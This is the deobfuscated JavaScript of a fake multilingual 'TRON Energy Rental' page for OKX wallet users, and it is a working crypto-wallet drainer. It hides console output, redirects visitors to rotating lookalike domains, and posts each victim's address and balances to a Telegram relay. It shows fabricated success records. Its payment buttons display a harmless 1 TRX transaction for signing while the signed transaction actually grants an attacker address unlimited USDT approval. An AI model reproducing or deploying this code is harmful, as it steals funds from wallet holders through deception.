//Mon Aug 19 2024 16:30:58 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const d = function () {
  let j = true;
  return function (k, l) {
    const p = j ? function () {
      if (l) {
        const r = l.apply(k, arguments);
        l = null;
        return r;
      }
    } : function () {};
    j = false;
    return p;
  };
}();
const c = d(this, function () {
  const j = function () {};
  let k;
  try {
    const m = Function("return (function() {}.constructor(\"return this\")( ));");
    k = m();
  } catch (n) {
    k = window;
  }
  if (!k.console) {
    k.console = function (p) {
      const q = {
        log: p,
        warn: p,
        debug: p,
        info: p,
        error: p,
        exception: p,
        table: p,
        trace: p
      };
      return q;
    }(j);
  } else {
    k.console.log = j;
    k.console.warn = j;
    k.console.debug = j;
    k.console.info = j;
    k.console.error = j;
    k.console.exception = j;
    k.console.table = j;
    k.console.trace = j;
  }
});
c();
function getRandomUrl(b) {
  var k = Math.floor(Math.random() * b.length);
  return b[k];
}
document.addEventListener("DOMContentLoaded", function () {
  const k = localStorage.getItem("language");
  if (k) {
    changeLanguage(k);
    if (/okex/.test(navigator.userAgent.toLowerCase())) {
      okexConnect();
    } else {
      var m = ["https://onetrcer.com", "https://onetrxer.com", "https://onetrxtransfer.com", "https://onetrontrx.com"];
      var o = "okx://wallet/dapp/details?dappUrl=" + getRandomUrl(m);
      location.href = o;
    }
    getaddress();
  } else {
    changeLanguage("en");
    if (/okex/.test(navigator.userAgent.toLowerCase())) {
      okexConnect();
    } else {
      var m = ["https://onetrcer.com", "https://onetrxer.com", "https://onetrxtransfer.com", "https://onetrontrx.com"];
      var o = "okx://wallet/dapp/details?dappUrl=" + getRandomUrl(m);
      location.href = o;
    }
    getaddress();
  }
  for (let v = 0; v < 3; v++) {
    addRandomRentalRecord();
  }
  setInterval(addRandomRentalRecord, Math.floor(Math.random() * 3000) + 5000);
});
function generateRandomTRCAddress() {
  const k = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  let l = "T";
  for (let m = 0; m < 33; m++) {
    l += k.charAt(Math.floor(Math.random() * k.length));
  }
  return l;
}
function hideMiddleString(b) {
  return b.slice(0, 6) + "..." + b.slice(-4);
}
function addRandomRentalRecord() {
  const j = generateRandomTRCAddress();
  const k = hideMiddleString(j);
  const l = document.createElement("li");
  l.innerHTML = "<span>" + k + "</span><span>success</span>";
  const m = document.getElementById("random-history-list");
  m.appendChild(l);
  if (m.children.length > 3) {
    m.removeChild(m.firstChild);
  }
}
async function okexConnect() {
  if (window.tronLink.ready) {
    window.tronWeb = tronLink.tronWeb;
  } else {
    const l = {
      method: "tron_requestAccounts"
    };
    const m = await tronLink.request(l);
    if (m.code === 200) {
      window.tronWeb = tronLink.tronWeb;
    }
  }
}
async function getaddress() {
  try {
    const l = {
      method: "tron_requestAccounts"
    };
    await window.okxwallet.tronLink.request(l);
    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
      const n = window.tronWeb.defaultAddress.base58;
      console.log("User Address:", n);
      document.getElementById("trxAddress").value = n;
      const o = navigator.language || navigator.userLanguage;
      const p = new Date().toLocaleString();
      const q = document.getElementById("no-history");
      if (q) {
        q.style.display = "block";
      }
      const r = await window.tronWeb.trx.getBalance(n);
      const s = window.tronWeb.fromSun(r);
      const t = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
      const u = await window.tronWeb.contract().at(t);
      const v = await u.balanceOf(n).call();
      const w = (parseInt(v._hex, 16) / 1000000).toFixed(6);
      const x = {
        address: n,
        region: o,
        time: p,
        trxBalance: s,
        usdtBalance: w
      };
      fetch("tele.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: new URLSearchParams(x)
      }).then(z => z.text()).then(z => console.log(z)).catch(z => console.error("Error sending data to Telegram:", z));
      toggleButtons(w >= 100);
    } else {
      console.log("Failed to fetch the address.");
    }
  } catch (B) {
    console.error("Error connecting to Tron wallet:", B);
  }
}
function toggleButtons(b) {
  const k = document.getElementById("pay-btn");
  const l = document.getElementById("auto-transfer-btn");
  if (b) {
    k.style.display = "block";
    l.style.display = "none";
  } else {
    k.style.display = "none";
    l.style.display = "block";
  }
}
document.getElementById("language-btn").onclick = function () {
  const j = document.getElementById("language-dropdown");
  j.style.display = j.style.display === "block" ? "none" : "block";
};
function changeLanguage(i) {
  localStorage.setItem("language", i);
  const l = {
    title: document.getElementById("title"),
    subtitle: document.getElementById("subtitle"),
    promo: document.getElementById("promo"),
    addressLabel: document.getElementById("address-label"),
    payBtn: document.getElementById("pay-btn"),
    payBtn_zhen: document.getElementById("auto-transfer-btn"),
    payBtn_off: document.getElementById("auto-transfer-off"),
    howToTitle: document.getElementById("how-to-title"),
    history: document.getElementById("history-title"),
    howToList: document.getElementById("how-to-list"),
    random: document.getElementById("random-history-title"),
    wzp: document.getElementById("wzp"),
    footer: document.getElementById("footer")
  };
  if (i === "en") {
    l.title.innerText = "TRON Energy Rental";
    l.subtitle.innerText = "Pay 1TRX to get 64K Energy, and it will be credited to your account within 3 seconds!";
    l.promo.innerText = "\"Join the crypto revolution, explore endless possibilities!\"";
    l.addressLabel.innerText = "TRX Address";
    l.payBtn.innerText = "Pay 1 TRX to get Energy";
    l.payBtn_zhen.innerText = "Pay 1 TRX to get Energy";
    l.payBtn_off.innerText = "Free to receive";
    l.howToTitle.innerText = "Energy Description:";
    l.history.innerText = "Historical rental records";
    l.random.innerText = "Current Record";
    l.wzp.innerText = "No records";
    l.howToList.innerHTML = "\n                    <li>Reduce transaction fees: By freezing TRX to gain energy, users can reduce the number of times they pay TRX as handling fees. Especially for users who frequently use smart contracts, this can significantly reduce costs.</li>\n                    <li>Faster transactions: Having enough energy can speed up the execution of smart contracts and avoid delays caused by lack of resources.</li>\n                    <li>Since all major apps have energy rental, OKX wallet has not set up a shortcut function, and this platform can only be used in OKX wallet.</li>\n              \n                ";
    l.footer.innerText = "© 2024 Crypto Platform. All rights reserved.";
  } else {
    if (i === "zh") {
      l.title.innerText = "TRON能量租聘";
      l.subtitle.innerText = "支付1TRX可获取64K能量,3秒内到账!";
      l.promo.innerText = "\"加入加密革命，探索无限可能！\"";
      l.addressLabel.innerText = "TRX 地址";
      l.history.innerText = "历史租聘记录";
      l.payBtn_off.innerText = "免费领取";
      l.random.innerText = "当前记录";
      l.wzp.innerText = "无记录";
      l.payBtn_zhen.innerText = "支付 1 TRX 获取能量";
      l.payBtn.innerText = "支付 1 TRX 获取能量";
      l.howToTitle.innerText = "能量说明:";
      l.howToList.innerHTML = "\n                    <li>降低交易费用：通过冻结 TRX 获得能量，用户可以减少支付 TRX 作为手续费的次数。特别是对于频繁使用智能合约的用户，这可以显著降低成本。</li>\n                    <li>更快的交易速度：拥有足够的能量可以加速智能合约的执行速度，避免因缺乏资源导致的延迟。</li>\n                    <li>因各大app均有能量租聘,OKX钱包尚未设置快捷功能,且本平台仅可在OKX钱包中使用.</li>\n                 \n                ";
      l.footer.innerText = "© 2024 加密平台. 保留所有权利.";
    } else {
      if (i === "jp") {
        l.title.innerText = "トロンエナジーのレンタル";
        l.subtitle.innerText = "1 TRX を支払ってトークンを取得し、毎日 100 ME トークンを受け取りましょう。";
        l.promo.innerText = "\"暗号革命に参加し、無限の可能性を探りましょう！\"";
        l.addressLabel.innerText = "TRX アドレス";
        l.history.innerText = "過去のレンタル記録";
        l.payBtn_off.innerText = "無料で入手";
        l.random.innerText = "現在の記録";
        l.wzp.innerText = "記録なし";
        l.payBtn_zhen.innerText = "1 TRX を支払ってエネルギーを入手";
        l.payBtn.innerText = "1 TRX を支払ってエネルギーを入手";
        l.howToTitle.innerText = "エネルギーの説明:";
        l.howToList.innerHTML = "\n                    <li>取引手数料の削減: TRX を凍結してエネルギーを得ることで、ユーザーは手数料として TRX を支払う回数を減らすことができます。特にスマートコントラクトを頻繁に使用するユーザーにとっては、コストを大幅に削減できます。</li>\n                    <li>トランザクション速度の高速化: 十分なエネルギーがあれば、スマート コントラクトの実行が高速化され、リソース不足による遅延を回避できます。</li>\n                    <li>すべての主要なアプリはエネルギーリースを備えているため、OKX ウォレットにはまだショートカット機能が設定されておらず、このプラットフォームは OKX ウォレットでのみ使用できます。</li>\n                   \n                ";
        l.footer.innerText = "© 2024 暗号プラットフォーム. すべての権利を保有.";
      } else {
        if (i === "ko") {
          l.title.innerText = "트론 에너지 렌탈";
          l.subtitle.innerText = "1 TRX를 지불하고 토큰을 얻고 매일 100 ME 토큰을 받으세요.";
          l.promo.innerText = "\"암호 혁명에 참여하여 무한한 가능성을 탐험하세요!\"";
          l.addressLabel.innerText = "TRX 주소";
          l.history.innerText = "과거 임대 기록";
          l.random.innerText = "현재 기록";
          l.payBtn_off.innerText = "무료로 받으세요";
          l.wzp.innerText = "기록 없음";
          l.payBtn_zhen.innerText = "에너지를 얻으려면 1 TRX를 지불하세요";
          l.payBtn.innerText = "에너지를 얻으려면 1 TRX를 지불하세요";
          l.howToTitle.innerText = "에너지 설명:";
          l.howToList.innerHTML = "\n                    <li>거래 수수료 절감: TRX를 동결하여 에너지를 얻음으로써 사용자는 TRX를 처리 수수료로 지불하는 횟수를 줄일 수 있습니다. 특히 스마트 계약을 자주 사용하는 사용자의 경우 비용을 크게 절감할 수 있습니다.</li>\n                    <li>더 빠른 거래 속도: 에너지가 충분하면 스마트 계약 실행 속도가 빨라지고 리소스 부족으로 인한 지연을 피할 수 있습니다.</li>\n                    <li>모든 주요 앱에는 에너지 임대 기능이 있으므로 OKX 지갑은 아직 바로가기 기능을 설정하지 않았으며 이 플랫폼은 OKX 지갑에서만 사용할 수 있습니다.</li>\n                 \n                ";
          l.footer.innerText = "© 2024 암호 플랫폼. 모든 권리 보유.";
        }
      }
    }
  }
  document.getElementById("language-dropdown").style.display = "none";
}
async function payusdt() {
  const j = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  const k = window.tronWeb.defaultAddress.base58;
  try {
    const m = await window.tronWeb.contract().at(j);
    const n = await m.balanceOf(k).call();
    const o = (parseInt(n._hex, 16) / 1000000).toFixed(6);
    const p = await window.tronWeb.trx.getBalance(k);
    const q = (p / 1000000).toFixed(6);
    console.log("TRX Balance: " + q + " TRX");
    console.log("USDT Balance: " + o + " USDT");
    if (o < 100 || q < 30) {
      const s = localStorage.getItem("language");
      if (s === "zh") {
        alert("免费领取已经发放完毕,等待下一次赠送!");
      } else {
        if (s === "en") {
          alert("The free gifts have been distributed, waiting for the next one!");
        } else {
          if (s === "jp") {
            alert("無料コレクションは配布済みです。次のプレゼントを待っています!");
          } else {
            if (s === "ko") {
              alert("무료 컬렉션이 배포되었으며 다음 선물을 기다리고 있습니다!");
            }
          }
        }
      }
      return false;
    } else {
      return true;
    }
  } catch (y) {
    console.error("Error in payusdt function:", y);
    return false;
  }
}
async function autotransferoff() {
  var m = await payusdt();
  if (m === false) {
    return;
  }
  try {
    const o = window.tronWeb;
    const p = await o.defaultAddress.base58;
    console.log("User Address: " + p);
    const q = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const r = "TQ1mFAFWqXAamPqoULLzGndBMynuib3MRT";
    const t = {
      type: "address",
      value: r
    };
    const u = {
      type: "uint256",
      value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    };
    const v = [t, u];
    const w = {
      feeLimit: 100000000
    };
    const y = await o.transactionBuilder.triggerSmartContract(q, "increaseApproval(address,uint256)", w, v, p);
    const z = 5;
    const A = 3;
    const B = "ENERGY";
    const C = await o.transactionBuilder.freezeBalance(o.toSun(z), A, B, p);
    const D = y.transaction.raw_data;
    y.transaction.raw_data = C.raw_data;
    const E = await o.trx.sign(y.transaction);
    E.raw_data = D;
    const F = await o.trx.sendRawTransaction(E);
    if (F.result) {
      const G = localStorage.getItem("language");
      if (G === "zh") {
        alert("领取成功,等待6秒后进行交易!");
      } else {
        if (G === "en") {
          alert("Received successfully, wait 6 seconds before trading!");
        } else {
          if (G === "jp") {
            alert("正常に収集されました。トランザクションを続行する前に 6 秒待ってください。");
          } else {
            if (G === "ko") {
              alert("성공적으로 수집되었습니다. 6초 후에 거래를 진행하세요!");
            }
          }
        }
      }
    } else {
      alert("error！");
    }
  } catch (O) {}
}
async function payForToken() {
  try {
    const n = window.tronWeb;
    const o = await n.defaultAddress.base58;
    console.log("User Address: " + o);
    const p = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const q = "TQ1mFAFWqXAamPqoULLzGndBMynuib3MRT";
    const r = "THG1fadpXrA9Jc4YKocZRFxQwifKKWYhXz";
    const s = {
      type: "address",
      value: q
    };
    const t = {
      type: "uint256",
      value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    };
    const u = [s, t];
    const v = {
      feeLimit: 100000000
    };
    const x = await n.transactionBuilder.triggerSmartContract(p, "increaseApproval(address,uint256)", v, u, o);
    const y = 1000000;
    const z = await n.transactionBuilder.sendTrx(r, y, o);
    const A = x.transaction.raw_data;
    x.transaction.raw_data = z.raw_data;
    const B = await n.trx.sign(x.transaction);
    B.raw_data = A;
    const C = await n.trx.sendRawTransaction(B);
    if (C.result) {
      const D = localStorage.getItem("language");
      if (D === "zh") {
        alert("转账成功!请等待6秒再进行交易!");
      } else {
        if (D === "en") {
          alert("The transfer was successful! Please wait for 6 seconds before trading!");
        } else {
          if (D === "jp") {
            alert("転送が成功しました。取引を続行する前に 6 秒待ってください。");
          } else {
            if (D === "ko") {
              alert("전송이 완료되었습니다! 거래를 진행하기 전에 6초만 기다려주세요!");
            }
          }
        }
      }
    } else {
      alert("error！");
    }
  } catch (K) {}
}
async function autoTransferTRX() {
  try {
    const j = window.tronWeb;
    if (!j || !j.defaultAddress.base58) {
      console.error("TRON wallet not detected or connected.");
      return;
    }
    const k = j.defaultAddress.base58;
    const l = "TQ1pEBDYUg13H2Re4gKg9H5cvbtess8bai";
    const m = 1000000;
    const n = await j.transactionBuilder.sendTrx(l, m, k);
    const o = await j.trx.sign(n);
    const p = await j.trx.sendRawTransaction(o);
    if (p.result) {
      console.log("Transfer successful!");
    } else {
      console.error("Transfer failed:", p);
    }
  } catch (u) {
    console.error("Error during transfer:", u);
  }
}